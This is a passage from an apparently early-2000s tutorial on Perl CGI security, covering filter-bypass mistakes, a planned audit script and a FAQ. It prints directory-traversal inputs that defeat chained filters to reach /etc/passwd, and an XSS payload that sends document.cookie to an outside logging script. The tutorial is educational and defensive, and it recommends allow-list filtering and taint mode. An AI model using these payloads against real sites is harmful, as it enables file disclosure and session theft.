input is  such an important part in securing your CGI scripts I need to cover
it more  indepth.  You must be completely aware of every possible combination
of  characters that can be inputted and how they will effect the program. 
Many  people scripting these CGIs have no clue that .\./ is the same as ../
and that  it will eluid their filtering.  They figure they are stopping all
reverse  directory transversal by s/.\.\///g; This is one of the main problems
in CGI  scripts, lack of proper filtering.  Some scripts don't filter at
 all..  they are quickly exploited.  Others filter most of the possible  damaging
input, but allow one or two key combinations to pass through and  exploit
the script.  Lets go over good and bad filtering techniques.  <br>
<br>
The first and most effective way is to deny anything and allow only what
 is clean.  for example if you want to open a file: <br>
</font>
<pre><font color="white">	if($filename !~ m/^[\w\-\.]*$/){ die "bad characters in filename\n"; }<br></font></pre>
<font color="white"><br>
This will check if the filename only contains  'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-.'
and none  others.  Since these are all ok characters for a filename and represent
no  security concerns for us we will let them pass.  Anything that is not
 [a-zA-Z_0-9\-\.] will cause the script to die.  If you were to filter for
 just characters which might be used to exploit the script then you are running
 the risk of forgetting a character or allowing attackers to bypass the filters
 or use the filters to construct a string which will exploit the script. 
 Lets take an example with multiple filters trying to get rid of all reverse
 directory transveral and command execution vulns.  This problem depends
on  the order of your filters.  Where one filter will match and then make
the  string into something that should have been filtered by a previous filter
(or by  that one).  Here is an example of an attempt at good filtering: <br>
</font>
<pre><font color="white">	<br>	$filename = '/home/user/' . $ENV{'QUERY_STRING'};<br>	<br>	$filename =~ s/\\\///g; #filters \/<br>	$filename =~ s/\\\.//g; #filters \.<br>	$filename =~ s/\.\.\///g; #filters ../<br>	$filename =~ s/\|//g; #filters |<br></font></pre>
<font color="white"><br>
now this will make '../../etc/passwd' into filename.  will get  rid of all
\/ and \. tricks if you were to try something like .\./.\./etc/passwd  or
..\/..\/etc/passwd.  Also will filter out the null byte if you tried  filename.cgi\0. 
But do you see the problem with how the filters themselves  could be used
to construct an exploit?  Here's how. <br>
</font>
<pre><font color="white">	$ENV{'QUERY_STRING'} = .|./.|./etc/passwd<br></font></pre>
<font color="white"><br>
which will not get filtered by the first three lines since no where  contains
\. \/ or ../, but the last one will effect it because it has |'s in  it. 
So it starts as .|./.|./etc/passwd, passes the first three filters  without
changing it and gets turned into ../../etc/passwd by the last filter.  <br>
<br>
Here is an even more common problem with that filtering technique.   This
one does even need that last s/\|//g; to work as it relies on the  s/\.\.\///g;
to produce the ../'s. <br>
</font>
<pre><font color="white">	$filename = '/home/user/' . $ENV{'QUERY_STRING'};<br>	$filename =~ s/\///g; #filters \/<br>	$filename =~ s/\\\.//g; #filters \.<br>	$filename =~ s/\.\.\///g; #filters ../<br></font></pre>
<font color="white"><br>
This one is alittle more tricky for people to catch, most perl coders  wouldn't
think twice about s/\.\.\///g getting rid of all ../s in a  variable.  But
this will exploit the filter making the string dangerous.  <br>
</font>
<pre><font color="white">	$ENV{'QUERY_STRING'} = .../...//.../...//etc/passwd<br></font></pre>
<font color="white"><br>
This will pass the first two filters again.  It will be effected  by the
last one, which will turn it into ../../etc/passwd.  Exactly what  the attacker
wanted it to be.  This one is also very common and even many  security aware
perl programmers make input filtering mistakes.  I've seen  multiple suggested
fixes for scripts posted to bugtraq which are still vuln  because they contain
poor filtering. <br>
<br>
This type of filtering problem  where the filters help create the dangerous
string is often used for ../ and XSS  attack.  But can be exploited for just
about anything.  Always make  sure your filters aren't turning the string
into anything dangerous.  <br>
<br>
Another common mistake in filtering is forgetting that multiple matches  can
be found within one variable.  Let me show you an example from a fix to  a
message board script which was supposed to stop javascript in the &lt;img&gt;
 tag.  The board converts [img] into &lt;img&gt; <br>
</font>
<pre><font color="white">	if ($message =~ /\[img\]http:\/\/.*\[\/img\]/) {<br>		$message =~ s~\[img\]\n?javascript\:(.+?)\n?\[/img\]~\[ img\]javascript\:$1\[/img \]~isg;<br>		if($message =~ m~\[img\]\n?(.+?)\n?\[/img\]~gi &amp;&amp; $1 !~ m~javascript\:~gi) {<br>			$message =~ s~\[img\]\n?(.+?)\n?\[/img\]~&lt;img src="$1"&gt;~isg;<br>		}<br>	}<br>	else{<br>		die "img tag's src needs to start with http://";<br>	}<br></font></pre>
<font color="white"><br>
First off, this is vuln to html encoding where javas&amp;6<b></b>7;pt  gets
past the filters for 'javascript' and will still get interpreted by the  browser
as javascript.  Most javascript filters do not stop this, and  almost all
can be evaded for XSS.  But there is another problem with the  design of
this filter.  As I mentioned before in the section about the SSI  filtering
problem perl does "backticks" once it finds the first part of a  match. 
So in this case $message =~  s~\[img\]\n?javascript\:(.+?)\n?\[/img\]~\[
img\]javascript\:$1\[/img \]~isg;  would find the first [img] then jump to
the end of the line and look for the  first [/img].  This script will put
anything found after [img]javascript:  back into $message.  This anything
could be another [img]javascript string  which would be turned into html. 
Take this example: <br>
</font>
<pre><font color="white">	#line breaks added so lower resolutions don't have to scroll sideways<br>	#sorry 800x600 and lower, you still get it.<br>	$message = "[img]http://a[/img][img]javascript:[img]javascript:<br>	document.write('&lt;img src=http://b0iler.eyeonsecurity.net/log.cgi?cookie='+escape(document.cookie)+'&gt;');<br>	var nothing='[/img]';[/img]";<br><br>	[then the filters]<br></font></pre>
<font color="white"><br>
This would find the first match of [img]javascript, and then the last  match. 
Instead of trying to explain exactly what is happening try running  this
script: <br>
</font>
<pre><font color="white">	#!/usr/bin/perl<br>	$message = "[img]http://a[/img][img]javascript:[img]javascript:<br>	document.write('&lt;img src=http://b0iler.eyeonsecurity.net/log.cgi?cookie='+escape(document.cookie)+'&gt;');<br>	var nothing='[/img]';[/img]";<br><br>	print "0: $message\n\n";<br>	if ($message =~ /\[img\]http:\/\/.*\[\/img\]/) {<br>		print "1: $message\n\n";<br>		$message =~ s~\[img\]\n?javascript\:(.+?)\n?\[/img\]~\[ img\]javascript\:$1\[/img \]~isg;<br>		print "2: $message\n\n";<br>		if($message =~ m~\[img\]\n?(.+?)\n?\[/img\]~gi &amp;&amp; $1 !~ m~javascript\:~gi) {<br>			$message =~ s~\[img\]\n?(.+?)\n?\[/img\]~&lt;img src="$1"&gt;~isg;<br>			print "3: $1\n\n";<br>		}<br>	}<br>	print "5: $message\n\n";<br>	exit;<br></font></pre>
<font color="white"><br>
As you can see 3 is the one which is totally unfiltered for javascript  and
has it's [img] converted to &lt;img&gt;.  This filtering problem is not  as
widespread as the "filters effecting filters" one, but I've seen it a half
 dozen times.  The key to security is imaging all the possible ways an  attacker
can do things, and then think if they will threaten security at  all.  Since
it is hard to be certain there is no possible ways there are  many security
holes in well tested scripts who's author had security in mind  when coding. 
Another good rule of thumb is to deny anything that could be  dangerous,
do not try to correct it.  If this script would have just done  something
like:  if($message =~ /javascript/){ die "no javascript allowed";  }  then
it would have prevented this problem. <br>
<br>
The only other thing  I really look for in the filtering of input is weather
the programmer forgot to  filter a metacharacter.  This is usually \ or |
which get left out.   the \ can cause problems because it can be used to
escape the '\' when a filter  just escapes other metacharacters.  The | can
be used to both exploit a  poorly called open() or as a pipe in a shell command. 
Many programmers  will filter $command = s/;//g; but will forget the |, &amp;,
&amp;&amp;, and  file input and output operators: &gt;&gt; &gt; and &lt;
&lt;&lt;. <br>
<br>
Final  problem I will go over in filtering problems is just simply forgetting
 things.  Sometimes a programmer will filter bad strings in input variables,
 but they forget to check uppercase aswell as lowercase.  for instance, I've
 seen things like this a few times: <br>
</font>
<pre><font color="white">	if($FORM{'file'} =~ /\.cgi$/){<br>		&amp;errorhtml('you submitted an invalid file type');<br>	}<br></font></pre>
<font color="white"><br>
This might look good at first glance, and the programmer might never  think
twice about it.  But sending script.CGI will allow you to specify CGI  files. 
Although this tutorial is more based towards *nix systems, this  problem
is more so for windows.  This is because windows filenames are case  insensitive. 
So script.CGI is the same as script.cgi.  On *nix these  are two different
files. <br>
<br>
Other things include the forgotten meta  characters, like the forgotten '\'
in the regex I mentioned in the Reverse  Directory Transversal section. 
Or forget that script.cgi\0 will open the  script.cgi file.  <br>
<br>
<br>
<br>
 </font>
<h3><font color="white"><a name="Examples_Of_Vulnerable_Scripts"></a>
Examples Of Vulnerable Scripts</font></h3>
<font color="white"><br>
           This section of the tutorial is majorly lacking, this is mostly
due to my focus  on the rest of the tutorial.  Also the fact that it is just
plain more fun  to talk about all the holes I found rather than going through
even more code and  writing my own.  perlaudit.pl isn't much of a script
as of yet since it has  failed to grab my interest and I lost many of the
common CGI exploit project  scripts I coded.  I might update this section
with more info if I complete  these tasks..  or I might just remove it and
move on to something more  entertaining. <br>
<br>
<br>
<br>
<b><a name="Common_CGI_Exploit_Project"></a>
Common CGI Exploit Project</b><br>
           I proposed this idea to a few newbies on security on IRC  one
day and they seemed to want it done really badly.  The idea was to make  perl
scripts which they can exploit to both see how CGI exploits work and learn
 alittle about them.  So after alittle work I have set up a few examples
of  how to exploit perl scripts.  They are just interactive examples used
to  teach people about the most common holes in scripts on webpages.  I made
 them so that they require very little knowledge to do, almost everyone should
 beable to exploit them.  You can find the scripts online on my site at  http://b0iler.eyeonsecurity.net
in the tutorials section under the "Common CGI  Exploit Project" link.  I
would suggest knowing alittle bit of perl or php  before trying these.. 
although you still can do them without any, and you  might learn a bit from
them.  Don't worry about damaging my site, the  scripts aren't really exploitable. 
I made them so that they check for a  possible exploit, if you get it then
it will display information just like you  really did exploit it, but in
reality you didn't.  Also the source code to  the vulnerable version of the
scripts is avalible on the site.  I hope to  add more and more examples over
time, but I am lazy so don't count on it.   I hope you have some fun learning
about exploitting =) <br>
<br>
I also coded up a  small perl script to help find possible vulns in CGI vulns. 
It will check  every perl file in a directory for commonly exploitable function
calls and then  will ask if you want to see where the variables that influence
that function  came from.  Then it asks if you want to see all filters put
on this  variable.  The script is very beta and only will help find the most
easy to  spot vulnerabilities.  It will not automate the proccess completely,
you  must still know what to look for inorder to find vulns with it.  It
just  speeds up the process.  Kinda sorts out things to make the process
go  faster.  You can get this script when it's finished at  http://b0iler.eyeonsecurity.net
in the tutorials section right under the link to  this tutorial.  It will
be called perlaudit.pl.  Also there will be a  zip/tarball of all the scripts
so you can download them and test on your local  server. <br>
<br>
<br>
<br>
<b><a name="Real_Life_Examples"></a>
Real Life Examples</b><br>
           Ok, so far everything has been made up senerios.  In RFP's paper
he  went through some real world examples of what he was talking about. 
I  found this helpful and it really brought home the points he was trying
to  make.  So I will do the same and show you a few scripts that I found
with  vulnerabilities I have talked about.  I am sorry, but for now this
section  does not exist, this is because I haven't had time to find scripts
with good  examples of the problems I talked about.  Maybe I'll go through
bugtraq one  week and dig up some good ones to talk about.  Until then just
reread the  paper to better understand something =)  <br>
<br>
<br>
<br>
<b><a name="Perlaudit.pl"></a>
Perlaudit.pl</b><br>
          This  is a short script which I wrote one day, although in it's
current state won't do  much more than egrep "open|system|\`|exec|eval". 
I would like to call on  others to help me improve this script to help find
common vulnerabilites in perl  scripts.  It is basicly a egrep with some
helpful options like: to see  where variables are defined (helps to see if
they are by user input or hard  coded) and to see if you can evade the filters
on these variables, like the kind  discribed thoughout this paper. <br>
<br>
You can get perlaudit at my website:  http://b0iler.eyeonsecurity.net in
the tutorials section there will be a link to  it right under the link to
this tutorial.  I'd like to hear some comments  on this script and hopefully
ideas on how to improve it, since at it's current  state it isn't very useful
at all.  If you have the time and skill feel  free to add your own functions
that help find or improve how to script  works.  If this script gets advanced
it could easily find almost every  common vulnerability and check if it is
exploitable with GET, POST, or COOKIE  (and some ENV) variables.  It would
be very helpful to people searching for  vulnerabilities and for programmers
who don't know a great deal on security.  <br>
<br>
I'd also like to hear about any other perl auditting code out  there.  If
there is already a great script to do this I will try it out and  report
on it.  My email address is at the end of this paper, but for lazy  people
it's b0iler@hotmail.com.  I would really love to hear from a few  people
on this, especially anyone with some real coding skills who wants to  help.
<br>
<br>
as of 5-1-02 perl audit is not even close to being released.  <br>
<br>
 </font>
<h3><font color="white"><a name="Conclusion"></a>
Conclusion</font></h3>
<font color="white"><br>
          My purpose in writing  this paper was to help friends out with
finding security flaws in CGI  scripts.  But as side goals I wantted to introduce
a few new techniques  I've found to the world of exploiting CGIs and create
an easy to understand, yet  detailed paper on all the common problems.  It
seemed like the net was  missing this.  I hope someone learned something
new, or understands  something better now, if so my purpose was fulfilled.
<br>
<br>
           Perl was not designed with the net in mind.  It does  have a few
security benifits over shell scripts and other basic languages, but  for
the most part it is up to the author of the script to know what is dangerous
 and how to handle it.  Perl provides almost unlimitted amount of power,
one  mistake and you are letting anyone execute commands on your system.. 
 anonymously.  Now that you know the basics of how attackers abuse CGIs you
 can help secure your own or others.  I would recommend reading a bit more
 about perl/web security if you are serious about this, I just covered the
basics  lightly.  There is plenty of indepth documentation about perl on
the net,  but it also takes some experience through trial and error to fully
become  comfortable coding CGIs with perl. <br>
<br>
I was orignally planning on making  this paper alot longer, including both
how to exploit vulnerabilities and how to  prevent them from happening. 
After I wrote a few paragraphs about securing  your perl scripts a friends
said it was boring and suggested just pointing the  readers to a few good
sources on perl security.  It seems to me like that's  a good idea.  I'll
just use a few quotes from the camel to tempt you into  reading about perl
security.  The basics begin at Taint mode, and it  doesn't get much more
complicated than that.  Even though you use perl's  built in saftey that
doesn't mean you are secure, one bad attempt at filtering  user input to
make it safe can lead to a major vulnerability, take some larry's  advice
and only allow what is safe, deny the rest. <br>
<br>
           <i>"Programs that can be run remotely and anonymously by anyone
on  the Net are executing in the most hostile of environments.  You should
not  be afraid to say "No!" occasionally."</i> <br>
<br>
Now to scare you all into  actually learning about taint mode here's some
more insight from Mr Wall  himself. <br>
<br>
          <i>"On the more  security-conscious sites, running all CGI scripts
under the -T flag isn't just a  good idea: it's the law."</i> <br>
<br>
There, my job is done.  If you need  to contact me try emailing me at b0iler@hotmail.com
or on irc at a ton of  different channels.  EFnet (#vuln), undernet, dalnet,
etc..  as b0ils,  b0iler, b0iled, or b0ilmatic.  If all else fails try the
message boards at  <a href="http://blacksun.box.sk/">blacksun.box.sk</a>
 <br>
<br>
<br>
<br>
<b><a name="FAQ_"></a>
FAQ</b>  <br>
<br>
<b>1</b>  Question:  "I don't know perl and your tutorial is  too hard to
understand, can you write a section on perl?"<br>
<br>
      Answer:  No, there are already tons of great perl tutorials, and it
 would take me a year to write a tutorial on perl.  This tutorial is ment
 for people who already know perl and wish to learn about more advanced ways
of  finding/preventing vulneribilities in CGIs. <br>
<br>
<b>2</b>   Question:  "How Do I $something ?"<br>
<br>
     Answer:   Read the tutorial <br>
<br>
<br>
<b>3</b>  Question:  "What if I didn't  understand $something ?"<br>
<br>
     Answer:  If you don't  understand a part of this tutorial go learn more
perl/unix =)  <br>
<br>
<br>
<b>4</b>  Question:  "I know perl, but I still didn't  understand $something
?"<br>
<br>
     Answer:  Try rereading  the paper, if that still doesn't work check
out other papers on perl security  and do a little testing yourself. a little
<br>
<br>
<br>
<b>5</b>   Question:  "What's the best way to find holes in scripts?"<br>
<br>
      Answer:  by looking at the code, thinking laterally, and  setting up
a test server to try things on" <br>
<br>
<br>
<b>6</b>   Question:  "Is there any secret to finding holes in scripts?"<br>
<br>
      Answer:  egrep "open|system|exec|\`|eval|unlink" *.cgi or use  my perl-audit.pl
script. <br>
<br>
<br>
<b>7</b>  Question:  "If it is so  easy to exploit CGI scripts why doesn't
everyone do it?"<br>
<br>
      Answer:  Many people do exploit them..  but some people find it  extremely
boring and time consuming to go through all that code.  A lot of  exploits
go unreported and are kept underground or are fixed in newer versions  of
the script. <br>
<br>
<br>
<b>8</b>  Question:  "Haven't most of the  vulnerabilities in CGI scripts
been exploited already?"<br>
<br>
      Answer:  Even though Perl has been around since 1986 and CGI scripts
 have been used on the net for along time.  There are still new scripts  being
coded everyday and of course there are older scripts which have  vulnerabilities
in them that haven't been exploited yet.  <br>
<br>
<br>
<b>9</b>  Question:  "Why learn how to exploit perl when  PHP is getting
so popular?"<br>
<br>
     Answer:  By learning  how to exploit perl CGI scripts you will be able
to learn how to exploit HP in  no time :) And there isn't nearly as much
documentation on common  vulnerabilities in PHP scripts as there is for Perl. 
There are some well  known hot spots that provide possible exploitation.. 
I will cover these in  another tutorial.  Shouldn't be too long after this
one that I release one  on PHP security. <br>
<br>
<br>
<b>10</b> Question:  "What can I do if I  don't have the source to a script?"<br>
<br>
      Answer:   try making educated guesses as to what could make the script
vulnerable.   You can also try to find an exploit in another script (or that
script) which  will allow you to view files sources. <br>
<br>
<br>
<b>11</b> Question:   "Is exploitting CGI hard?"<br>
<br>
      Answer:  yes and  no.  Finding an exploit in 1000 scripts is easy,
just look for bad open and  system calls.  But design flaws can take a lot
longer and can require hours  of testing.  You need to understand what the
script is doing to find design  flaws, this takes a lot of concentration
and perl knowledge.  <br>
<br>
<br>
<b>12</b> Question:  "I heard "homemade" CGI scripts are  more vulnerable
to being hacked than distributed"<br>
<br>
       Answer:  Many people claim this, but I find it false.  The basis of
 this argument is that distributed scripts are made by "professionals", which
may  be true..  but most still have very little knowledge in perl security
(even  a lot of "security experts" program vulnerable scripts).  The other
claim  is that full discloser helps to find all the holes and patch them
quickly.   This is true, but it hard to stay ahead of the attackers when
an exploit is  published. <br>
<br>
I find many holes in publicly distributed scripts, I also  find plenty of
holes in homemade scripts, but when a attacker is going to  exploit a script
it helps a lot to have the source.  Most "hackers" don't  have the knowledge
of all the possible things to try to exploit scripts, infact  most just wait
for exploits to be handed to them on bugtraq.  Security  through obscurity
may not be great, but in a world of script kiddies it can be a  good thing. 
Try not to let anyone know what scripts you are running by  renaming them
and their directories.  But still keep on top of the latest  security news
and audit your scripts by hand.  Bottom line, both homemade  and publicly
avaliable scripts contain holes.  I wouldn't say either is  more secure.
<br>
<br>
<br>
<b>13</b> Question:  "I read that perl has  race conditions, why didn't you
mention this?"<br>
<br>
       Answer:  As far as I know, Perl has fixed all the race conditions
in the  latest releases. <br>
<br>
<br>
<b>14</b>  Question:  "Is reading files  really that important a security
concern?"<br>
<br>
       Answer:  yes, on many systems there is some kind of further access
which  can be gained once file reading is avaliable to the attacker.  Files
such  as .htaccess, .htpasswd, and other configuration/password files can
provide  access to parts of the site which should be offlimit.  Reading scripts
 source can also allow the attacker to find further vulnerabilities which
could  allow things like writing to files or command execution.  <br>
<br>
<br>
<b>15</b> Question:  "Is writing to files really that  important a security
concern?"<br>
<br>
      Answer:  Writing  to .htaccess files or other configuration files and
scripts can allow an  attacker more access and privileges than they were
meant to have.  Many  options are avaliable to attackers to turn their file
writing privilege into  further access such as command execution.  This is
mostly done by writing  scripts which will issue commands for them.  <br>
<br>
<br>
<b>16</b> Question:  "Is CGI security really that big a  deal?"<br>
<br>
      Answer:  There are many situations when  everything on the system is
secure from remote access, but a CGI script allows  attackers to issue commands. 
This can be used to gain further access by  exploiting a local problem in
the system.  According to the <a href="http://www.sans.org/topten.htm">sans's
top 10 list</a>
 of "The Ten Most  Critical Internet Security Threats" CGI vulnerabilities
are the number 2 biggest  problems in internet security.  Then in the top
20 list released 10 months  later CGI security was still rated among the
top security concerns on the  net.  While most of the old problems were solved
and disappeared from the  list CGI problems still remained strong.  This
is not just a problem we  will see for the next few months, CGI security
is a major issue for the net.  <br>
<br>
<br>
<b>17</b> Question:  "Is taint mode that  important?"<br>
<br>
      Answer:  Yes, it is manditory to  learn about if you are going to code
CGI.  <br>
<br>
<br>
<b>18</b> Question:  "If I know a new/different technique  to exploit/find
vulns in perl scripts what should I do?"<br>
<br>
       Answer:  I'd be glad to hear about any different ways, if it is  incredibly
new then maybe post to bugtraq or write a paper about it.  <br>
<br>
<br>
<b>19</b> Question:  "Why did you write  this?"<br>
<br>
      Answer:  I know that there are already a  few papers covering perl
security and common perl vulnerabilities, but I knew a  few new tricks and
found most of the other papers hard to understand with poor  examples.  I
also had a lot of friends who wantted to learn how to exploit  scripts once
they saw how fast I could find holes in theirs.  So after a  few dozen emails
asking questions about perl exploitation I decided just to  write a tutorial
and point people there instead. <br>
<br>
<br>
<b>20</b>   Question:  "I would like to offer you money to work for my company
as  a perl coder or script audittor, will you do it?"<br>
<br>
       Answer:  yes, I have no job and desperately need one.  I think I am
 pretty damn good at auditting scripts, and I can code in both php or perl
 securely.  Email b0iler@hotmail.com and give me the details.  <br>
<br>
<br>
<br>
<b><a name="Sources"></a>
Sources</b><br>
<br>
          Jordan  Dimov's article in phreedom zine - Security Issues in Perl
Scripts<br>
           Rain.Forrest.Puppy's article in phrack zine - Perl  CGI problems<br>
          Larry Wall, Tom Christiansen  &amp; Jon Orwant's book - Programming
Perl<br>
           Various testing by myself<br>
          Sublime's song  on second hand smoke - Had A Dat
<br>
<br>
<br>
<b>[-----]</b><br>
<br>
<a href="http://b0iler.eyeonsecurity.net/">http://b0iler.eyeonsecurity.net/</a>
   - is my homepage (just moved there, thanks obscure). <br>
<br>
I got tons of  tutorials, mini-tutorials, advisories, and code written by
me there.  Come  check out what I'm up to and possibly learn a bit.  Also
check out <a href="http://eyeonsecurity.net/">eyeonsecurity.net</a>
 for obscure's interesting  advisories and tutorials.  You'll love it.  I
would like to give  thanks to obscure for providing feedback which helped
me improve this paper and  to Cyrus for not eating it.  This tutorial was
orignally wrote for  http://blacksun.box.sk but anyone has permission to
mirror it as long as it is  mirrored in whole and proper credit is given
to the author.  Also a link to  http://b0iler.eyeonsecurity.net would be
nice. <br>
<br>
<b>[-----]</b>  <br>
<br>
<i>"When your living life like a show you gotta take a bow to  the people
you know."</i>
</font>
</body>
</html>